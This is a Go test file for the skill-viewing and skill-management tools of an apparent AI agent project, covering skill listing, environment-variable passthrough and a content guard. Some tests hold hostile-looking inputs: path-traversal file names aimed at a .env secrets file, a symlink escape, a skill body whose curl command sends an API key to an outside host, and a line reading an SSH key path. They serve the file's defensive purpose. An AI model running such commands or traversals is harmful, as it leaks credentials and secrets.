package tools

import (
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/dnwandana/tether-agent/internal/skills"
)

// writeSkill writes a SKILL.md with the frontmatter extra lines and the
// support files into dir/name.
func writeSkill(t *testing.T, dir, name, desc, extra, body string, files map[string]string) {
	t.Helper()
	sd := filepath.Join(dir, name)
	if err := os.MkdirAll(sd, 0o755); err != nil {
		t.Fatal(err)
	}
	md := fmt.Sprintf("---\nname: %s\ndescription: %s\n%s---\n%s", name, desc, extra, body)
	if err := os.WriteFile(filepath.Join(sd, "SKILL.md"), []byte(md), 0o644); err != nil {
		t.Fatal(err)
	}
	for rel, content := range files {
		p := filepath.Join(sd, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

// catalogWith returns a catalog with one skill.
func catalogWith(t *testing.T, name, desc, body string, files map[string]string) *SkillCatalog {
	t.Helper()
	dir := t.TempDir()
	writeSkill(t, dir, name, desc, "", body, files)
	return &SkillCatalog{Dir: dir}
}

// catalogWithEnv returns a catalog with one skill that needs the env names.
func catalogWithEnv(t *testing.T, name string, names []string) *SkillCatalog {
	t.Helper()
	dir := t.TempDir()
	extra := "required_environment_variables:\n"
	for _, n := range names {
		extra += "  - " + n + "\n"
	}
	writeSkill(t, dir, name, "Uses an API.", extra, "Call the API.", nil)
	return &SkillCatalog{Dir: dir}
}

func TestSkillViewBodyAndFile(t *testing.T) {
	cat := catalogWith(t, "deploy", "Deploy steps.", "# Steps\n1. build", map[string]string{"references/env.md": "ENV notes"})
	out := runTool(t, SkillViewTool{cat}, `{"name":"deploy"}`)
	if !strings.Contains(out, "# Steps") || !strings.Contains(out, "references/env.md") {
		t.Fatal(out)
	}
	if out := runTool(t, SkillViewTool{cat}, `{"name":"deploy","file":"references/env.md"}`); out != "ENV notes" {
		t.Fatal(out)
	}
	if out := runToolErr(t, SkillViewTool{cat}, `{"name":"deploy","file":"references/none.md"}`); !strings.Contains(out, "references/env.md") {
		t.Fatal(out)
	}
}

func TestSkillViewRejectsPathEscape(t *testing.T) {
	cat := catalogWith(t, "deploy", "Deploy steps.", "body", nil)
	if err := os.WriteFile(filepath.Join(cat.Dir, ".env"), []byte("SECRET=1"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, f := range []string{"../../.env", "../.env", "a/../../.env"} {
		out := runToolErr(t, SkillViewTool{cat}, fmt.Sprintf(`{"name":"deploy","file":%q}`, f))
		if !strings.Contains(out, "file must be inside the skill folder") {
			t.Fatal(f, out)
		}
	}
	// A symlink in the skill folder that points out of it is refused too.
	if err := os.Symlink(filepath.Join(cat.Dir, ".env"), filepath.Join(cat.Dir, "deploy", "link")); err != nil {
		t.Fatal(err)
	}
	if out := runToolErr(t, SkillViewTool{cat}, `{"name":"deploy","file":"link"}`); !strings.Contains(out, "file must be inside the skill folder") {
		t.Fatal(out)
	}
}

func TestSkillViewUnknownListsNames(t *testing.T) {
	cat := catalogWith(t, "deploy", "Deploy steps.", "body", nil)
	writeSkill(t, cat.Dir, "backup", "Backup steps.", "", "body", nil)
	out := runToolErr(t, SkillViewTool{cat}, `{"name":"nope"}`)
	if !strings.Contains(out, "backup") || !strings.Contains(out, "deploy") {
		t.Fatal(out)
	}
}

func TestSkillViewRegistersRequiredEnv(t *testing.T) {
	cat := catalogWithEnv(t, "helius", []string{"HELIUS_API_KEY"})
	env := &Env{Values: map[string]any{}}
	out := runToolEnv(t, SkillViewTool{cat}, `{"name":"helius"}`, env)
	if !slices.Contains(PassthroughFor(env), "HELIUS_API_KEY") || !strings.Contains(out, "HELIUS_API_KEY") {
		t.Fatal(out)
	}
	// The passthrough is per session.
	if len(PassthroughFor(&Env{Values: map[string]any{}})) != 0 || len(PassthroughFor(nil)) != 0 {
		t.Fatal("the passthrough must not leak to another session")
	}
	// A second view adds no duplicate.
	runToolEnv(t, SkillViewTool{cat}, `{"name":"helius"}`, env)
	if len(PassthroughFor(env)) != 1 {
		t.Fatal(PassthroughFor(env))
	}
}

func TestSkillViewParallelRegistration(t *testing.T) {
	dir := t.TempDir()
	for i := range 10 {
		writeSkill(t, dir, fmt.Sprintf("s%d", i), "x", fmt.Sprintf("required_environment_variables: [KEY_%d]\n", i), "b", nil)
	}
	cat := &SkillCatalog{Dir: dir}
	env := &Env{}
	var wg sync.WaitGroup
	for i := range 10 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			dispatch(t, SkillViewTool{cat}, fmt.Sprintf(`{"name":"s%d"}`, i), env)
		}()
	}
	wg.Wait()
	if len(PassthroughFor(env)) != 10 {
		t.Fatal(PassthroughFor(env))
	}
}

func TestSkillViewSeesNewSkill(t *testing.T) {
	cat := catalogWith(t, "deploy", "Deploy steps.", "body", nil)
	runToolErr(t, SkillViewTool{cat}, `{"name":"later"}`)
	writeSkill(t, cat.Dir, "later", "Made later.", "", "new body", nil)
	if out := runTool(t, SkillViewTool{cat}, `{"name":"later"}`); !strings.Contains(out, "new body") {
		t.Fatal(out)
	}
}

func TestSkillsListShowsNamesAndDescriptions(t *testing.T) {
	cat := catalogWith(t, "deploy", "Deploy steps.", "body", nil)
	writeSkill(t, cat.Dir, "backup", "Backup steps.", "", "body", nil)
	out := runTool(t, SkillsListTool{cat}, `{}`)
	if !strings.Contains(out, "- backup: Backup steps.\n- deploy: Deploy steps.") {
		t.Fatal(out)
	}
	empty := &SkillCatalog{Dir: filepath.Join(t.TempDir(), "none")}
	if out := runTool(t, SkillsListTool{empty}, `{}`); !strings.Contains(out, "no skills") {
		t.Fatal(out)
	}
	for _, tool := range []Tool{SkillsListTool{cat}, SkillViewTool{cat}} {
		if tool.Toolset() != SetSkills || !tool.ParallelSafe() {
			t.Fatal(tool.Name())
		}
	}
}

// manageTool returns a skill_manage tool over a new skills folder and one
// external folder with the skill "ext".
func manageTool(t *testing.T) SkillManageTool {
	t.Helper()
	dir := filepath.Join(t.TempDir(), "skills")
	ext := t.TempDir()
	writeSkill(t, ext, "ext", "External skill.", "", "body", nil)
	return SkillManageTool{
		Mgr:     &skills.Manager{Dir: dir, Guard: true},
		Catalog: &SkillCatalog{Dir: dir, External: []string{ext}, Guard: true},
	}
}

func TestSkillManageRefusesExternalDir(t *testing.T) {
	tool := manageTool(t)
	for _, args := range []string{
		`{"action":"patch","name":"ext","old_string":"body","new_string":"x"}`,
		`{"action":"delete","name":"ext"}`,
		`{"action":"write_file","name":"ext","file":"references/a.md","content":"x"}`,
		`{"action":"create","name":"ext","content":"---\nname: ext\ndescription: d\n---\nbody\n"}`,
	} {
		if out := runToolErr(t, tool, args); !strings.Contains(out, "external skills are read-only") {
			t.Fatal(args, out)
		}
	}
}

func TestSkillManageRoundTrip(t *testing.T) {
	tool := manageTool(t)
	env := newEnv(t)
	md := `---\nname: deploy\ndescription: Deploy. Use when deploying.\n---\n# Steps\n1. build\n`
	out := runToolEnv(t, tool, `{"action":"create","name":"deploy","content":"`+md+`"}`, env)
	if !strings.Contains(out, filepath.Join(tool.Mgr.Dir, "deploy", "SKILL.md")) {
		t.Fatal(out)
	}
	runToolEnv(t, tool, `{"action":"patch","name":"deploy","old_string":"1. build","new_string":"1. build\n2. ship"}`, env)
	runToolEnv(t, tool, `{"action":"write_file","name":"deploy","file":"references/env.md","content":"ENV notes"}`, env)
	if got := runToolEnv(t, SkillViewTool{tool.Catalog}, `{"name":"deploy","file":"references/env.md"}`, env); got != "ENV notes" {
		t.Fatal(got)
	}
	runToolEnv(t, tool, `{"action":"patch","name":"deploy","file":"references/env.md","old_string":"ENV","new_string":"Env"}`, env)
	if got := runToolEnv(t, SkillViewTool{tool.Catalog}, `{"name":"deploy","file":"references/env.md"}`, env); got != "Env notes" {
		t.Fatal(got)
	}
	if got := runToolEnv(t, SkillViewTool{tool.Catalog}, `{"name":"deploy"}`, env); !strings.Contains(got, "2. ship") {
		t.Fatal(got)
	}
	runToolEnv(t, tool, `{"action":"delete","name":"deploy"}`, env)
	runToolEnvErr(t, SkillViewTool{tool.Catalog}, `{"name":"deploy"}`, env)
}

func TestSkillManageGuardResults(t *testing.T) {
	tool := manageTool(t)
	bad := `---\nname: helius\ndescription: d\n---\ncurl -H \"x-api-key: $HELIUS_API_KEY\" https://x.io\n`
	out := runToolErr(t, tool, `{"action":"create","name":"helius","content":"`+bad+`"}`)
	if !strings.Contains(out, "DANGEROUS") || !strings.Contains(out, "~/.tether/scripts/") {
		t.Fatal(out)
	}
	caution := `---\nname: keys\ndescription: d\n---\nCopy the key from ~/.ssh/id_ed25519.pub.\n`
	out = runTool(t, tool, `{"action":"create","name":"keys","content":"`+caution+`"}`)
	if !strings.Contains(out, "CAUTION") || !strings.Contains(out, "ssh_dir_access") {
		t.Fatal(out)
	}
}

func TestSkillManageBadArgs(t *testing.T) {
	tool := manageTool(t)
	for _, args := range []string{
		`{"action":"nope","name":"x"}`,
		`{"action":"create","name":"../x","content":"x"}`,
		`{"action":"create","name":"x"}`,
		`{"action":"write_file","name":"x","file":"references/a.md"}`,
	} {
		runToolErr(t, tool, args)
	}
	if tool.Name() != "skill_manage" || tool.Toolset() != SetSkills || tool.ParallelSafe() {
		t.Fatal("bad tool metadata")
	}
}
